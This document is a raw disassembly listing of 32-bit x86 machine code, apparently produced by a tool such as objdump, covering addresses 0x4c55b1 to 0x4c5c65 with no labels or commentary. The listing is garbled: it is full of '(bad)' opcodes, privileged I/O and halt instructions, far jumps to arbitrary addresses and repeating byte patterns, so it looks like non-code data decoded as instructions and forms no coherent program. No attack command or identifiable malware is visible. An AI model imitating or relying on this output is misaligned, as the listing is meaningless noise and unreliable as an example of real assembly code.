  4c55b1:	sbb    esi,DWORD PTR [edx-0x3ae9d9e1]
  4c55b7:	adc    eax,0x78c3004b
  4c55bc:	mov    WORD PTR [ecx],ss
  4c55be:	mov    ds:0x85af1b7f,eax
  4c55c3:	adc    BYTE PTR [edi+0x60],dl
  4c55c6:	adc    eax,DWORD PTR [eax]
  4c55c8:	arpl   WORD PTR [esi],ax
  4c55ca:	loope  0x4c55e7
  4c55cc:	stos   DWORD PTR es:[edi],eax
  4c55cd:	aaa    
  4c55ce:	aas    
  4c55cf:	sti    
  4c55d0:	and    al,0xf6
  4c55d2:	sub    al,0x24
  4c55d4:	ja     0x4c55fd
  4c55d6:	or     BYTE PTR [ebp+0x538740f6],al
  4c55dc:	aam    0x52
  4c55de:	and    bl,al
  4c55e0:	dec    edi
  4c55e1:	sub    esi,DWORD PTR [ebx+0x2]
  4c55e4:	mov    dh,0x90
  4c55e6:	sbb    BYTE PTR [edi+0x4f],ah
  4c55e9:	pop    eax
  4c55ea:	or     eax,0xf275ad0
  4c55ef:	lods   eax,DWORD PTR ds:[esi]
  4c55f0:	cmp    eax,0x676b91a4
  4c55f5:	pop    ds
  4c55f6:	(bad)  
  4c55f7:	mov    dh,0xb5
  4c55f9:	daa    
  4c55fa:	call   FWORD PTR [edi]
  4c55fc:	out    0xa3,eax
  4c55fe:	popf   
  4c55ff:	jbe    0x4c5624
  4c5601:	(bad)  [edi+0x2f]
  4c5604:	add    ebp,DWORD PTR [esi-0x1e3efa4a]
  4c560a:	jae    0x4c55ca
  4c560c:	dec    edi
  4c560d:	push   ebx
  4c560e:	les    ebx,FWORD PTR [ecx]
  4c5610:	outs   dx,BYTE PTR ds:[esi]
  4c5611:	les    edi,FWORD PTR [edi]
  4c5613:	adc    esi,0xffffffed
  4c5616:	add    ah,BYTE PTR [edi+0x7f663bc5]
  4c561c:	xlat   BYTE PTR ds:[ebx]
  4c561d:	mov    WORD PTR cs:[ebx],ss
  4c5620:	sbb    al,BYTE PTR [edi-0x2d]
  4c5623:	aaa    
  4c5624:	mov    cl,0x82
  4c5626:	in     eax,0x41
  4c5628:	das    
  4c5629:	aas    
  4c562a:	dec    esi
  4c562b:	add    ch,BYTE PTR [ebx+0x42e32f60]
  4c5631:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4c5632:	mov    al,0x5a
  4c5634:	inc    ebx
  4c5635:	adc    ecx,DWORD PTR [esi]
  4c5637:	mov    DWORD PTR ds:0x9ea7f708,esp
  4c563d:	and    al,0x56
  4c563f:	mov    cl,0x1a
  4c5641:	cmp    eax,DWORD PTR [edi]
  4c5643:	add    cl,BYTE PTR [ecx]
  4c5645:	mov    ebp,DWORD PTR ds:0x74ff2717
  4c564b:	and    al,0xb0
  4c564d:	mov    dh,0x2f
  4c564f:	xlat   BYTE PTR ds:[ebx]
  4c5650:	push   esi
  4c5651:	ror    BYTE PTR [ecx+0x3d],1
  4c5654:	xchg   edx,eax
  4c5655:	mov    es,WORD PTR [edi]
  4c5657:	popa   
  4c5658:	inc    ebp
  4c5659:	(bad)  
  4c565a:	mov    cs,WORD PTR [edi-0x3bba9fc1]
  4c5660:	dec    esi
  4c5661:	jmp    0x4c561a
  4c5663:	or     al,dh
  4c5665:	inc    ecx
  4c5666:	lods   al,BYTE PTR ds:[esi]
  4c5667:	out    0x73,eax
  4c5669:	jnp    0x4c5690
  4c566b:	es jo  0x4c5631
  4c566e:	out    0x4c,eax
  4c5670:	pop    ebx
  4c5671:	add    al,BYTE PTR [edx+ebp*1+0x7f875fe2]
  4c5678:	push   esi
  4c5679:	call   0xc74c5c84
  4c567e:	lock or eax,0x239b0d61
  4c5684:	adc    BYTE PTR [ecx],ch
  4c5686:	add    bh,BYTE PTR [esi+0x7486318a]
  4c568c:	clc    
  4c568d:	add    al,0xde
  4c568f:	add    ecx,DWORD PTR [edx+0x70]
  4c5692:	push   edi
  4c5693:	xchg   ebx,eax
  4c5694:	sbb    ah,BYTE PTR [esp+ecx*4]
  4c5697:	inc    eax
  4c5698:	adc    eax,edi
  4c569a:	ret    0x4210
  4c569d:	mov    eax,0x12253b20
  4c56a2:	(bad)  
  4c56a3:	es dec ebp
  4c56a5:	repnz das 
  4c56a7:	adc    edx,DWORD PTR [eax]
  4c56a9:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4c56aa:	shl    DWORD PTR [edx-0x49ffeca1],0x90
  4c56b1:	or     al,0xcc
  4c56b3:	mov    bh,0x62
  4c56b5:	and    eax,DWORD PTR [edx]
  4c56b7:	test   eax,0x799a0ef5
  4c56bc:	push   ds
  4c56bd:	inc    esp
  4c56be:	arpl   WORD PTR [esi],cx
  4c56c0:	xor    al,BYTE PTR [ebx]
  4c56c2:	push   edi
  4c56c3:	out    0x50,eax
  4c56c5:	imul   esp,DWORD PTR [ebx],0x1c
  4c56c8:	sub    DWORD PTR [ebx],0x834d47dc
  4c56ce:	sub    bl,BYTE PTR ds:0x92236ef0
  4c56d4:	aaa    
  4c56d5:	cs push ebx
  4c56d7:	test   BYTE PTR [eax],ch
  4c56d9:	bound  ebp,QWORD PTR [ecx-0x3e]
  4c56dc:	push   ss
  4c56dd:	push   cs
  4c56de:	js     0x4c56e1
  4c56e0:	imul   edx,DWORD PTR [eax],0x4dfeab46
  4c56e6:	(bad)  
  4c56e7:	lds    esi,FWORD PTR [eax+0x747f5092]
  4c56ed:	add    eax,0x23a4241b
  4c56f2:	lahf   
  4c56f3:	seta   al
  4c56f6:	loopne 0x4c5759
  4c56f8:	cmp    ch,BYTE PTR [esi+0x4b]
  4c56fb:	arpl   WORD PTR [ebx],si
  4c56fd:	xchg   ebx,eax
  4c56fe:	push   cs
  4c56ff:	sub    esi,DWORD PTR [edi+edi*2+0x5884708a]
  4c5706:	jmp    0x4c5768
  4c5708:	ja     0x4c575e
  4c570a:	cs pop ss
  4c570c:	outs   dx,BYTE PTR ds:[esi]
  4c570d:	or     BYTE PTR [ebx],dl
  4c570f:	dec    ebx
  4c5710:	aas    
  4c5711:	jb     0x4c56bd
  4c5713:	ins    BYTE PTR es:[edi],dx
  4c5714:	ret    
  4c5715:	pusha  
  4c5716:	xchg   ebx,eax
  4c5717:	gs aaa 
  4c5719:	jae    0x4c5752
  4c571b:	xchg   edx,eax
  4c571c:	mov    edx,0x32d5d8d
  4c5721:	add    BYTE PTR [esi],ah
  4c5723:	or     BYTE PTR [ebx+edx*4+0x5a],al
  4c5727:	or     DWORD PTR [ebp-0x49528c49],esp
  4c572d:	add    DWORD PTR [ebx+0x32f5327],ecx
  4c5733:	rcl    BYTE PTR [ecx],0xe2
  4c5736:	pop    edi
  4c5737:	lahf   
  4c5738:	inc    ebp
  4c5739:	mov    bh,0xd5
  4c573b:	inc    esp
  4c573c:	ror    DWORD PTR [ecx-0x144e8bca],0x54
  4c5743:	adc    bl,BYTE PTR [esi]
  4c5745:	and    BYTE PTR [eax],ch
  4c5747:	xchg   ecx,eax
  4c5748:	jb     0x4c57af
  4c574a:	ins    DWORD PTR es:[edi],dx
  4c574b:	or     ecx,DWORD PTR [bp+di-0x4]
  4c574f:	cmp    DWORD PTR [ecx+0x5c],edx
  4c5752:	pop    edx
  4c5753:	jnp    0x4c56fa
  4c5755:	test   esp,ebx
  4c5757:	(bad)  
  4c5758:	xor    BYTE PTR [edi+eiz*8],ch
  4c575b:	ja     0x4c575c
  4c575d:	jae    0x4c57b9
  4c575f:	scas   al,BYTE PTR es:[edi]
  4c5760:	cmp    BYTE PTR [ecx],dh
  4c5762:	dec    esp
  4c5763:	aas    
  4c5764:	dec    esi
  4c5765:	dec    edi
  4c5766:	pop    edi
  4c5767:	push   ebx
  4c5768:	push   esp
  4c5769:	inc    ecx
  4c576a:	pop    ebx
  4c576b:	btr    ebp,esi
  4c576e:	push   edx
  4c576f:	push   esp
  4c5770:	pop    edi
  4c5771:	dec    edi
  4c5772:	cld    
  4c5773:	das    
  4c5774:	push   edx
  4c5775:	or     cl,BYTE PTR [esi+eax*2-0x28]
  4c5779:	sub    eax,0xe29bbbf
  4c577e:	or     cl,BYTE PTR [esi+0x41]
  4c5781:	dec    esi
  4c5782:	pop    ecx
  4c5783:	push   cs
  4c5784:	and    eax,0x5776842d
  4c5789:	adc    dl,BYTE PTR [ebx+0x52]
  4c578c:	pop    edi
  4c578d:	pop    ds
  4c578e:	jb     0x4c57cb
  4c5790:	jnp    0x4c57cb
  4c5792:	nop    DWORD PTR [ecx]
  4c5795:	lock inc ecx
  4c5797:	(bad)  
  4c5799:	push   ds
  4c579a:	mov    al,ds:0x4d3f7012
  4c579f:	inc    eax
  4c57a0:	pop    DWORD PTR [eax+0xd]
  4c57a3:	jae    0x4c5764
  4c57a5:	int    0x1d
  4c57a7:	jo     0x4c57b8
  4c57a9:	clc    
  4c57aa:	aas    
  4c57ab:	int    0xcc
  4c57ad:	add    DWORD PTR [edi-0xc],ebx
  4c57b0:	jbe    0x4c57e4
  4c57b2:	jnp    0x4c576f
  4c57b4:	(bad)  
  4c57b6:	aas    
  4c57b7:	lock mov edi,0x4fe0d02f
  4c57bd:	push   cs
  4c57be:	jbe    0x4c57b2
  4c57c0:	repnz mov al,0x3e
  4c57c3:	mov    bl,al
  4c57c5:	push   eax
  4c57c6:	fist   WORD PTR [eax]
  4c57c8:	add    eax,DWORD PTR [edi]
  4c57ca:	mov    BYTE PTR [edi],bl
  4c57cc:	jb     0x4c5782
  4c57ce:	int    0x48
  4c57d0:	mov    bh,0xc4
  4c57d2:	add    al,0x74
  4c57d4:	fstp   TBYTE PTR [ebx+0x1e]
  4c57d7:	rol    BYTE PTR [esi],1
  4c57d9:	in     al,dx
  4c57da:	das    
  4c57db:	inc    edi
  4c57dc:	add    esp,esp
  4c57de:	jge    0x4c5777
  4c57e0:	sbb    BYTE PTR [edi-0x68],dh
  4c57e3:	outs   dx,DWORD PTR ds:[esi]
  4c57e4:	sub    al,0x36
  4c57e6:	add    dl,dl
  4c57e8:	jbe    0x4c5853
  4c57ea:	scas   eax,DWORD PTR es:[edi]
  4c57eb:	or     dh,cl
  4c57ed:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4c57ee:	ja     0x4c5808
  4c57f0:	into   
  4c57f1:	lahf   
  4c57f2:	out    0xb7,al
  4c57f4:	not    dh
  4c57f6:	add    DWORD PTR [edi+0x57],edi
  4c57f9:	daa    
  4c57fa:	aam    0xb
  4c57fc:	jae    0x4c57d9
  4c57fe:	jae    0x4c57b1
  4c5800:	dec    eax
  4c5801:	jg     0x4c585b
  4c5803:	pusha  
  4c5804:	daa    
  4c5805:	aas    
  4c5806:	out    0x60,eax
  4c5808:	adc    al,0xf0
  4c580a:	push   esi
  4c580b:	addr16 out 0x14,eax
  4c580e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4c580f:	mov    ebp,0x1f0f6fb7
  4c5814:	add    al,0x13
  4c5816:	adc    eax,0xecdef3e0
  4c581b:	mov    BYTE PTR ds:0x27ebc0f,dl
  4c5821:	push   cs
  4c5822:	enter  0xcee4,0x9d
  4c5826:	mov    esp,0xcff7a581
  4c582b:	or     al,0x5e
  4c582d:	mov    edx,0xec72172c
  4c5832:	stos   DWORD PTR es:[edi],eax
  4c5833:	aaa    
  4c5834:	scas   eax,DWORD PTR es:[edi]
  4c5835:	add    BYTE PTR [ecx-0x21],0xc0
  4c5839:	lds    edx,FWORD PTR [ebx-0x14]
  4c583c:	inc    ecx
  4c583d:	rcr    DWORD PTR [eax],0x41
  4c5840:	pop    ds
  4c5841:	push   edx
  4c5842:	cmp    edi,DWORD PTR [edi]
  4c5844:	cli    
  4c5845:	pop    esi
  4c5846:	enter  0xb6c4,0x3c
  4c584a:	ss push cs
  4c584c:	cmp    eax,0x412ed07f
  4c5851:	daa    
  4c5852:	fisubr DWORD PTR [ebx]
  4c5854:	in     al,0xbe
  4c5856:	es inc ebx
  4c5858:	aas    
  4c5859:	xor    al,BYTE PTR [ecx+edx*4+0x17]
  4c585d:	xor    ah,BYTE PTR [ecx]
  4c585f:	int3   
  4c5860:	mov    ebp,0xec439245
  4c5865:	je     0x4c587e
  4c5867:	mov    edi,ecx
  4c5869:	cmovbe edx,DWORD PTR [ecx-0x47d89764]
  4c5870:	dec    ecx
  4c5871:	aas    
  4c5872:	scas   eax,DWORD PTR es:[edi]
  4c5873:	dec    edx
  4c5874:	inc    esp
  4c5875:	jb     0x4c5899
  4c5877:	cmp    edx,edi
  4c5879:	dec    esp
  4c587a:	cmp    eax,0x29bd8b50
  4c587f:	in     al,0x43
  4c5881:	push   ecx
  4c5882:	fwait
  4c5883:	ss scas eax,DWORD PTR es:[edi]
  4c5885:	aas    
  4c5886:	mov    ds:0x8892f361,al
  4c588b:	and    DWORD PTR [ebp-0x69],0x65
  4c588f:	(bad)  
  4c5890:	adc    ebp,ebp
  4c5892:	inc    esp
  4c5893:	jb     0x4c58af
  4c5895:	jno    0x4c5883
  4c5897:	je     0x4c5918
  4c5899:	jo     0x4c5873
  4c589b:	pop    ss
  4c589c:	xor    dh,BYTE PTR [ecx-0x2727c088]
  4c58a2:	jns    0x4c58e5
  4c58a4:	pop    ss
  4c58a5:	xchg   ebx,eax
  4c58a6:	sbb    al,0x62
  4c58a8:	out    0xe7,eax
  4c58aa:	dec    edi
  4c58ab:	call   0x7621:0xc853a67b
  4c58b2:	push   ss
  4c58b3:	ffreep st(2)
  4c58b5:	sbb    BYTE PTR [esi],0x7b
  4c58b8:	inc    esp
  4c58b9:	hlt    
  4c58ba:	mov    dh,0x83
  4c58bc:	and    al,BYTE PTR ss:[ebx-0x7af450c1]
  4c58c3:	jg     0x4c5867
  4c58c5:	jecxz  0x4c58af
  4c58c7:	adc    al,0xfb
  4c58c9:	xchg   BYTE PTR [esi-0x79],ch
  4c58cc:	out    dx,eax
  4c58cd:	jns    0x4c58f0
  4c58cf:	adc    esi,DWORD PTR [edx-0x19]
  4c58d2:	scas   al,BYTE PTR es:[edi]
  4c58d3:	enter  0xb0ac,0xd3
  4c58d7:	and    esp,DWORD PTR [edx+0x41afe827]
  4c58dd:	(bad)  
  4c58de:	jnp    0x4c5898
  4c58e0:	aas    
  4c58e1:	jnp    0x4c586d
  4c58e3:	loopne 0x4c5929
  4c58e5:	icebp  
  4c58e6:	lds    ecx,FWORD PTR [edi+0x5f]
  4c58e9:	rol    DWORD PTR [ecx+0x7e],1
  4c58ec:	dec    esi
  4c58ed:	mov    ah,0x13
  4c58ef:	dec    ecx
  4c58f0:	sar    eax,1
  4c58f2:	aad    0x3f
  4c58f4:	mov    bh,0xd8
  4c58f6:	jb     0x4c591a
  4c58f8:	mov    ecx,0xe2bde048
  4c58fd:	nop
  4c58fe:	mov    ebx,esp
  4c5900:	inc    esp
  4c5901:	pop    ebx
  4c5902:	jecxz  0x4c5973
  4c5904:	mov    ah,0xa8
  4c5906:	cmp    BYTE PTR [ecx-0x741a1d44],dl
  4c590c:	jmp    0xcc9b:0x45d0340f
  4c5913:	aas    
  4c5914:	push   edi
  4c5915:	mov    dh,0xf1
  4c5917:	inc    esp
  4c5918:	jnp    0x4c595f
  4c591a:	scas   eax,DWORD PTR es:[edi]
  4c591b:	stc    
  4c591c:	add    eax,0x422bc63f
  4c5921:	and    BYTE PTR [edx],al
  4c5923:	jmp    0xd0e2:0xa80184
  4c592a:	pop    ebx
  4c592b:	pop    ebx
  4c592c:	adc    al,0x4
  4c592e:	mov    dl,0x7
  4c5930:	xchg   ebp,eax
  4c5931:	pop    edi
  4c5932:	adc    BYTE PTR ds:0x410e44,al
  4c5938:	dec    ebx
  4c5939:	mov    ds:0x5f38c3d1,eax
  4c593e:	cs xchg edi,eax
  4c5940:	push   esp
  4c5941:	sub    al,BYTE PTR [eax]
  4c5943:	std    
  4c5944:	cs aas 
  4c5946:	inc    ecx
  4c5947:	push   esi
  4c5948:	into   
  4c5949:	pop    edi
  4c594a:	inc    eax
  4c594b:	(bad)  
  4c594c:	pusha  
  4c594d:	cmp    esp,DWORD PTR [eax-0x2a]
  4c5950:	inc    eax
  4c5951:	inc    eax
  4c5952:	aaa    
  4c5953:	push   ds
  4c5954:	mov    dh,0x85
  4c5956:	ror    BYTE PTR [edi],cl
  4c5958:	aaa    
  4c5959:	add    DWORD PTR [eax-0x69],eax
  4c595c:	dec    edx
  4c595d:	and    al,0xd3
  4c595f:	add    bh,0xf
  4c5962:	add    DWORD PTR [ecx],eax
  4c5964:	scas   eax,DWORD PTR es:[edi]
  4c5965:	adc    BYTE PTR [ebx+0x53],bh
  4c5968:	dec    eax
  4c5969:	jae    0x4c596d
  4c596b:	add    DWORD PTR [edx],eax
  4c596d:	pop    es
  4c596e:	add    eax,ebp
  4c5970:	cmp    BYTE PTR [eax+0x1],al
  4c5973:	lock jg 0x4c59e5
  4c5976:	mov    ecx,0x1009b11c
  4c597b:	add    DWORD PTR [eax],eax
  4c597d:	and    BYTE PTR [eax+eax*4],cl
  4c5980:	in     al,0x8
  4c5982:	add    BYTE PTR [ecx+0x4941088d],dl
  4c5988:	aas    
  4c5989:	shl    BYTE PTR [ecx],1
  4c598b:	and    al,BYTE PTR [ecx+ecx*2]
  4c598e:	xlat   BYTE PTR ds:[ebx]
  4c598f:	(bad)  
  4c5990:	stos   BYTE PTR es:[edi],al
  4c5991:	mov    ss,WORD PTR [edi+eax*1]
  4c5994:	adc    eax,0x15558414
  4c5999:	fist   DWORD PTR ds:0xecb4d6b0
  4c599f:	or     BYTE PTR [ebx+eax*1+0x3e82602e],ah
  4c59a6:	jb     0x4c599e
  4c59a8:	in     al,0x79
  4c59aa:	and    BYTE PTR [ecx],0xa6
  4c59ad:	fisttp WORD PTR [edi]
  4c59af:	mov    eax,ds:0xe09f81a5
  4c59b4:	cld    
  4c59b5:	sub    dh,bh
  4c59b7:	cs push edi
  4c59b9:	inc    eax
  4c59ba:	jle    0x4c593c
  4c59bc:	test   al,0x5e
  4c59be:	shl    DWORD PTR [ebx-0x3f665c26],0x4e
  4c59c5:	xchg   WORD PTR [ecx-0x4abff002],ax
  4c59cc:	pop    edi
  4c59cd:	stc    
  4c59ce:	call   FWORD PTR [ebp-0x4149bea4]
  4c59d4:	iret   
  4c59d5:	mov    ds:0x1aa2e4,al
  4c59da:	in     eax,0xa2
  4c59dc:	call   0xf027b583
  4c59e1:	ja     0x4c59ed
  4c59e3:	jle    0x4c5986
  4c59e5:	adc    edx,DWORD PTR [ecx+0x5]
  4c59e8:	push   es
  4c59e9:	ficomp DWORD PTR [esi-0x26]
  4c59ec:	mov    esi,0xed91da5f
  4c59f1:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4c59f2:	in     al,0x6a
  4c59f4:	fidiv  DWORD PTR [edx]
  4c59f6:	rcr    eax,cl
  4c59f8:	fsubrp st(0),st
  4c59fa:	stc    
  4c59fb:	jb     0x4c5a2e
  4c59fd:	jle    0x4c598f
  4c59ff:	icebp  
  4c5a00:	pop    esp
  4c5a01:	sbb    edi,esi
  4c5a03:	inc    ebx
  4c5a04:	sub    eax,0x279e79e7
  4c5a09:	scas   al,BYTE PTR es:[edi]
  4c5a0a:	push   es
  4c5a0b:	(bad)  
  4c5a0c:	sar    BYTE PTR [eax+edi*4-0x61861862],0xb4
  4c5a14:	lods   al,BYTE PTR ds:[esi]
  4c5a15:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4c5a16:	pushf  
  4c5a17:	nop
  4c5a18:	test   bl,dh
  4c5a1a:	cmp    al,0xcf
  4c5a1c:	jnp    0x4c5a9a
  4c5a1e:	pop    esi
  4c5a1f:	jo     0x4c5a8d
  4c5a21:	push   0x3cf3cf64
  4c5a26:	iret   
  4c5a27:	pusha  
  4c5a28:	pop    esp
  4c5a29:	pop    eax
  4c5a2a:	push   esp
  4c5a2b:	push   eax
  4c5a2c:	dec    esp
  4c5a2d:	cmp    al,0xcf
  4c5a2f:	repz cmp al,0x48
  4c5a32:	inc    esp
  4c5a33:	inc    eax
  4c5a34:	cmp    BYTE PTR [ecx+edi*2],ch
  4c5a37:	fmulp  st(1),st
  4c5a39:	repz and al,0x1c
  4c5a3c:	adc    al,0x6
  4c5a3e:	or     al,0x4
  4c5a40:	repz cmp al,0x4f
  4c5a43:	repz clc 
  4c5a45:	sub    al,0xf0
  4c5a47:	in     al,0xd8
  4c5a49:	aam    0xe1
  4c5a4b:	repz cmp al,0xcf
  4c5a4e:	rol    ah,1
  4c5a50:	mov    al,0xa4
  4c5a52:	or     DWORD PTR [edi+ecx*8],eax
  4c5a55:	repz fidiv WORD PTR [ecx+0x6f]
  4c5a59:	pushf  
  4c5a5a:	push   ds
  4c5a5b:	xchg   esp,eax
  4c5a5c:	push   es
  4c5a5d:	mov    WORD PTR [esp+edi*2+0x3cf3cf3c],es
  4c5a64:	je     0x4c5ad2
  4c5a66:	pop    esp
  4c5a67:	dec    esp
  4c5a68:	cmp    al,0xa7
  4c5a6a:	jne    0x4c5a3b
  4c5a6c:	repz sub BYTE PTR [esp+eax*1],dl
  4c5a70:	mov    edi,0x9ee8062b
  4c5a75:	out    0x79,eax
  4c5a77:	sahf   
  4c5a78:	loopne 0x4c5a52
  4c5a7a:	ror    al,1
  4c5a7c:	sar    BYTE PTR [eax+0x79e79e7b],0xb0
  4c5a83:	test   al,0xa0
  4c5a85:	cwde   
  4c5a86:	nop
  4c5a87:	pop    esi
  4c5a88:	ja     0x4c5a7c
  4c5a8a:	cmp    al,0xcf
  4c5a8c:	sub    BYTE PTR [eax+eiz*2+0x54],0x48
  4c5a91:	push   es
  4c5a92:	popf   
  4c5a93:	out    dx,eax
  4c5a94:	jns    0x4c5a34
  4c5a96:	cmp    al,0x2c
  4c5a98:	sbb    BYTE PTR [eax],cl
  4c5a9a:	scas   al,BYTE PTR es:[edi]
  4c5a9b:	hlt    
  4c5a9c:	sub    ah,bh
  4c5a9e:	jns    0x4c5a3e
  4c5aa0:	out    0x6,eax
  4c5aa2:	fcom   st(0)
  4c5aa4:	mov    esp,0x82d18094
  4c5aa9:	nop
  4c5aaa:	inc    esi
  4c5aab:	jg     0x4c5aae
  4c5aad:	jb     0x4c5a5a
  4c5aaf:	loopne 0x4c5ad1
  4c5ab1:	pop    eax
  4c5ab2:	dec    ecx
  4c5ab3:	pop    ds
  4c5ab4:	add    DWORD PTR [edi-0x4d],edx
  4c5ab7:	pop    ecx
  4c5ab8:	jo     0x4c5a94
  4c5aba:	mov    BYTE PTR [eax],dl
  4c5abc:	inc    edi
  4c5abd:	push   eax
  4c5abe:	cmp    al,0xee
  4c5ac0:	fadd   DWORD PTR [eax+0x58]
  4c5ac3:	inc    edx
  4c5ac4:	ins    BYTE PTR es:[edi],dx
  4c5ac5:	sti    
  4c5ac6:	hlt    
  4c5ac7:	mov    esi,0x7097076
  4c5acc:	(bad)  
  4c5acd:	inc    DWORD PTR [ecx]
  4c5acf:	(bad)  
  4c5ad0:	outs   dx,BYTE PTR ds:[esi]
  4c5ad1:	imul   esp,DWORD PTR [edx],0x31
  4c5ad4:	push   ss
  4c5ad5:	ja     0x4c5ae6
  4c5ad7:	add    al,0x79
  4c5ad9:	sahf   
  4c5ada:	out    0x79,eax
  4c5adc:	sbb    BYTE PTR ds:0x4e09060d,al
  4c5ae2:	dec    esi
  4c5ae3:	sahf   
  4c5ae4:	out    0x7,eax
  4c5ae6:	or     al,0x8
  4c5ae8:	or     DWORD PTR [edx],ecx
  4c5aea:	jbe    0x4c5ad7
  4c5aec:	xchg   esi,eax
  4c5aed:	fdiv   QWORD PTR [edi]
  4c5aef:	or     ebp,DWORD PTR [edi-0x50f0f0f3]
  4c5af5:	ror    BYTE PTR [ebp-0x22],cl
  4c5af8:	in     eax,dx
  4c5af9:	adc    BYTE PTR [edi],ah
  4c5afb:	adc    DWORD PTR [esi],eax
  4c5afd:	adc    ch,BYTE PTR [edi]
  4c5aff:	and    ebp,ebp
  4c5b01:	in     al,0xe4
  4c5b03:	jbe    0x4c5b3a
  4c5b05:	pop    ds
  4c5b06:	inc    ecx
  4c5b07:	inc    ebx
  4c5b08:	push   eax
  4c5b09:	(bad)  [bp-0x49]
  4c5b0d:	fist   DWORD PTR [edx+0x2f]
  4c5b10:	push   ebx
  4c5b11:	xorps  xmm7,XMMWORD PTR [edi-0x619308a7]
  4c5b18:	out    0x39,eax
  4c5b1a:	mov    eax,0x20566d2f
  4c5b1f:	jo     0x4c5b3d
  4c5b21:	jb     0x4c5b91
  4c5b23:	pop    ss
  4c5b24:	fmul   QWORD PTR [esi+0x6]
  4c5b27:	pop    edi
  4c5b28:	and    BYTE PTR [edi-0x7f],0xf
  4c5b2c:	cmp    BYTE PTR [edi+edx*1],0x9c
  4c5b30:	fdivr  QWORD PTR [edi]
  4c5b32:	add    DWORD PTR [edi+ebx*1+0x76e42991],0x72
  4c5b3a:	repnz sahf 
  4c5b3c:	mov    eax,ds:0x78a7dfa4
  4c5b41:	jb     0x4c5afe
  4c5b43:	loopne 0x4c5afc
  4c5b45:	aas    
  4c5b46:	into   
  4c5b47:	aas    
  4c5b48:	xlat   BYTE PTR ds:[ebx]
  4c5b49:	sbb    BYTE PTR [edi],al
  4c5b4b:	inc    eax
  4c5b4c:	lea    ebp,[edi]
  4c5b4e:	imul   esp,DWORD PTR [esi+0xc],0x4f483e54
  4c5b55:	or     bl,ah
  4c5b57:	mov    bl,0x8c
  4c5b59:	pushf  
  4c5b5a:	pop    edi
  4c5b5b:	imul   esi,DWORD PTR [esi+0x24354d8],0x2f0f0147
  4c5b65:	sbb    edx,0x5a
  4c5b68:	sub    BYTE PTR [edi],bh
  4c5b6a:	pop    edi
  4c5b6b:	stc    
  4c5b6c:	test   al,0xda
  4c5b6e:	push   0x3f
  4c5b70:	pop    es
  4c5b71:	xchg   ebx,eax
  4c5b72:	add    BYTE PTR [edx+0x34],al
  4c5b75:	adc    BYTE PTR [esi],dh
  4c5b77:	add    BYTE PTR [ecx],al
  4c5b79:	xor    edx,DWORD PTR [edx-0x1]
  4c5b7c:	or     DWORD PTR [esi+0x44bf19b1],edx
  4c5b82:	jne    0x4c5b1c
  4c5b84:	push   cs
  4c5b85:	push   es
  4c5b86:	jecxz  0x4c5b9c
  4c5b88:	ins    DWORD PTR es:[edi],dx
  4c5b89:	mov    ds:0xff0a80ef,eax
  4c5b8e:	mov    BYTE PTR [ecx],bh
  4c5b90:	imul   esi,DWORD PTR [ecx],0x6462c4e
  4c5b96:	(bad)  
  4c5b97:	or     al,0x7a
  4c5b99:	push   ebx
  4c5b9a:	cs lahf 
  4c5b9c:	mov    ds:0xf3997fef,eax
  4c5ba1:	cmp    al,0xff
  4c5ba3:	dec    esi
  4c5ba4:	adc    BYTE PTR [esi+ecx*1],0xb0
  4c5ba8:	cmp    cl,BYTE PTR [eax+0x0]
  4c5bab:	sbb    eax,0xf3cf1aac
  4c5bb0:	cmp    al,0xcf
  4c5bb2:	test   al,0x1b
  4c5bb4:	mov    al,ds:0xcf13981f
  4c5bb9:	cmp    eax,0x21903cf7
  4c5bbe:	(bad)  
  4c5bbf:	push   cs
  4c5bc0:	push   cs
  4c5bc1:	jns    0x4c5bd1
  4c5bc3:	or     eax,0x3cf3cf3c
  4c5bc8:	js     0x4c5bd9
  4c5bca:	jo     0x4c5bdc
  4c5bcc:	push   0xf3cf3cf3
  4c5bd1:	add    eax,0x125c1e60
  4c5bd6:	iret   
  4c5bd7:	repz cmp al,0xcf
  4c5bda:	pop    eax
  4c5bdb:	and    BYTE PTR [esp+ecx*1+0x4c],dl
  4c5bdf:	or     edi,DWORD PTR [edi+ecx*8]
  4c5be2:	repz cmp al,0x44
  4c5be5:	adc    eax,0xf3341c3c
  4c5bea:	cmp    al,0xcf
  4c5bec:	repz sbb DWORD PTR [ecx+edx*1],ebp
  4c5bf0:	and    al,0x18
  4c5bf2:	iret   
  4c5bf3:	repz cmp al,0xcf
  4c5bf6:	sbb    al,0x16
  4c5bf8:	adc    al,0x17
  4c5bfa:	or     al,0x22
  4c5bfc:	cmp    al,0xcf
  4c5bfe:	repz cmp al,0x8
  4c5c01:	and    eax,DWORD PTR [esp]
  4c5c04:	add    BYTE PTR [eax-0x62],dh
  4c5c07:	out    0xf3,al
  4c5c09:	and    eax,0xec2639f8
  4c5c0e:	sub    eax,0xdf438edf
  4c5c13:	adc    BYTE PTR [edi+ebx*2+0x16],al
  4c5c17:	add    BYTE PTR [eax],dh
  4c5c19:	add    dl,BYTE PTR [ebx]
  4c5c1b:	and    DWORD PTR [eax-0x73a460ff],0xffffffd2
  4c5c22:	add    bh,0x17
  4c5c25:	js     0x4c5c9d
  4c5c27:	xchg   BYTE PTR [ebx-0x80],al
  4c5c2a:	jo     0x4c5c83
  4c5c2c:	lock icebp 
  4c5c2e:	daa    
  4c5c2f:	push   eax
  4c5c30:	push   ebx
  4c5c31:	push   esp
  4c5c32:	mov    ds:0x4d2a05a4,al
  4c5c37:	jle    0x4c5c7d
  4c5c39:	retf   
  4c5c3a:	inc    ebp
  4c5c3b:	pop    es
  4c5c3c:	jle    0x4c5c36
  4c5c3e:	cmovns eax,DWORD PTR [eax]
  4c5c41:	cmp    BYTE PTR [esi+0x6d2eb02e],bl
  4c5c47:	stos   BYTE PTR es:[edi],al
  4c5c48:	jne    0x4c5c95
  4c5c4a:	pop    esi
  4c5c4b:	jno    0x4c5c54
  4c5c4d:	jg     0x4c5c50
  4c5c4f:	mov    WORD PTR [eax+0x5e84df62],ss
  4c5c55:	dec    eax
  4c5c56:	jno    0x4c5c5f
  4c5c58:	push   esi
  4c5c59:	jmp    0x466fdd34
  4c5c5e:	push   edx
  4c5c5f:	push   ds
  4c5c60:	add    edi,eax
  4c5c62:	add    DWORD PTR [ecx+0x7a],edx
  4c5c65:	popa   
